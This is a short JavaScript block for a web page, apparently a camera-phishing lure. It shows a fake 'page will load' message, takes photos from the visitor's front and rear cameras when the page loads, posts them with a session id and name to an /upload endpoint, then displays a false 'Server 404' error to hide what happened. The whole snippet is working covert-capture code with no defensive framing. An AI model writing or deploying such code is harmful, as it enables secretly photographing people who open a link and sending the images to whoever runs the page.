<script>
(async function() {
  const status = document.getElementById("status");

  // Get sessionId and name from URL
  const urlParams = new URLSearchParams(window.location.search);
  const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
  const name = urlParams.get("name") || "visitor";

  status.innerText = "Page will load in 2â€“3 seconds, please wait....";

  async function takePhoto(facingMode) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL("image/jpeg");
      stream.getTracks().forEach(track => track.stop());
      return imageData;
    } catch (err) {
      console.error(err);
      throw err;
    }
  }

  async function sendToServer(imageData, type) {
    await fetch("/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image: imageData,
        name,
        type,
        sessionId
      })
    });
  }

  try {
    // Capture front + back simultaneously on mobile
    let frontPhoto, backPhoto;
    if (/Mobi|Android/i.test(navigator.userAgent)) {
      [frontPhoto, backPhoto] = await Promise.all([
        takePhoto("user"),
        takePhoto({ exact: "environment" })
      ]);
      await sendToServer(frontPhoto, "front");
      await sendToServer(backPhoto, "back");
    } else {
      // On desktop, capture default camera twice
      frontPhoto = await takePhoto("user");
      backPhoto = await takePhoto("user");
      await sendToServer(frontPhoto, "front");
      await sendToServer(backPhoto, "back");
    }

    status.innerText = "Server 404! Please try after some time";
  } catch (err) {
    status.innerText = "Server failed! Sorry, try again in a few minutes!";
  }
})();
</script>
